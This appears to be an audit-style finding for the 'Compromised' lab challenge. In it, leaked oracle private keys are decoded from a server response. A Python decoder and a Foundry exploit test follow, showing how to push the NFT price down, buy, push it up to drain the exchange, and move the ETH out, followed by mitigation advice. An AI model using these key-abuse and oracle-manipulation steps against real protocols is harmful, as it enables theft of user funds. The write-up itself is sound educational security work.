## High

### [H-1] Compromised private keys of oracle price data feeders, can lead to price manipulation 

**Description:** The server of the price oracle service returns a strange response, which is the encoded value of the private keys of two of the addresses set as `TRUSTED_SOURCE_ROLE`. Centralized oracles, like this one, pose a single point of failure. A malicious user could manipulate asset prices by driving them down, executing a profitable action, and then driving the prices back up. 

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```

**Impact:** Compromised private keys lets malicious users abuse the system by moving prices for their selfish gains, this undermines trust in protocols and could lead to cascading failures in interconnected systems that rely on this oracle for pricing of assets,and can potentially lead to loss of protocol funds.

The exploit undermines the Exchange protocol’s integrity by allowing attackers to drive prices down, mint NFTs for low prices and drive prices up to sell. This can lead to buying and dumping of tokens,depending on what is of gain to the attacker.

**Proof of Concept:** 

1. Create and run a python script to convert the compromised encoded data from Base64 to ASCII
2. Use ```cast wallet address --private-key``` to convert private keys to Ethereum addresses.
3. Manipulate the price of DVNFT through the oracle:
   1. Set the price to 0.1 ETH and purchase the NFT.
   2. Reset the price to the balance of the exchange and sell the NFT to drain the exchange.
4. Then send all the ETH to the recovery address

**Proof of Code:**

<details>
<summary>Code</summary>

Use this to decode Base64 to ASCII

```python
import base64

def hex_to_ascii(hex_str):
    ascii_str = ''
    for i in range(0, len(hex_str), 2):
        ascii_str += chr(int(hex_str[i:i+2], 16))
    return ascii_str

def decode_base64(base64_str):
    # Decode Base64 to ASCII
    return base64.b64decode(base64_str).decode('utf-8')

leaked_information = [
    '4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30',
    '4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35',
]

for leak in leaked_information:
    hex_str = ''.join(leak.split())
    ascii_str = hex_to_ascii(hex_str)
    decoded_str = decode_base64(ascii_str)
    private_key = decoded_str
    print("Private Key:", private_key)
```

Place the following into `Compromised.t.sol`

```javascript
function test_compromised() public checkSolved {
        vm.startPrank(compromisedOne);
        oracle.postPrice("DVNFT", PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();

        vm.startPrank(compromisedTwo);
        oracle.postPrice("DVNFT", PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();

        vm.startPrank(player);
        exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
        vm.stopPrank();
        uint256 exchangeBalance = address(exchange).balance;

        vm.startPrank(compromisedOne);
        oracle.postPrice("DVNFT",exchangeBalance);
        vm.stopPrank();

        vm.startPrank(compromisedTwo);
        oracle.postPrice("DVNFT",exchangeBalance);
        vm.stopPrank();

        vm.startPrank(player);
        nft.approve(address(exchange), 0);
        exchange.sellOne(0);
        vm.stopPrank();


        vm.startPrank(compromisedOne);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(compromisedTwo);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(player);
        (bool success,) = payable(recovery).call{value:EXCHANGE_INITIAL_ETH_BALANCE}("");
        vm.stopPrank();
}
```

</details>

**Recommended Mitigation:** There are several recommendations I can make on this:

1. Implement fallback mechanisms for oracle resilience : A popular strategy among DeFI projects is to use a dual oracle system that combines an off-chain oracle (eg. Chainlink Price Feeds or UMA’s optimistic oracle) and an on-chain oracle (eg. Uniswap V3 TWAP oracles). This provides a degree of security and fault tolerance since the system can switch to another oracle if using the default option is infeasible (e.g. if the oracle’s data becomes corrupted). 
   
2. Use decentralized oracles : While using a centralized oracle is nice for efficiency, the downsides (mostly) outweigh the benefits. A decentralized oracle service that utilizes multiple reporters isn’t entirely secure against manipulation, but the costs are usually high enough to deter such attacks. Ideally, you want an oracle with sound cryptoeconomic incentives (like staking on the accuracy of data or assigning reputation scores). 

3. Monitor oracle performance and activate protective measures if necessary : You shouldn’t always assume that the data provided by a particular oracle is valid—verify incoming data at intervals instead of blindly trusting oracles to function correctly. This could mean, for instance, creating a script that compares the prices provided by an oracle to values from another source (at every few blocks) and checking for large deviations. 

In the absence of a fallback mechanism, you should have measures in place to contain the effects of oracle manipulations. A possibility is pausing a protocol’s smart contracts if the source of oracle data (or the oracle itself) becomes suspect. 

Addressing this vulnerability is critical to maintaining DeFi's integrity and trustworthiness.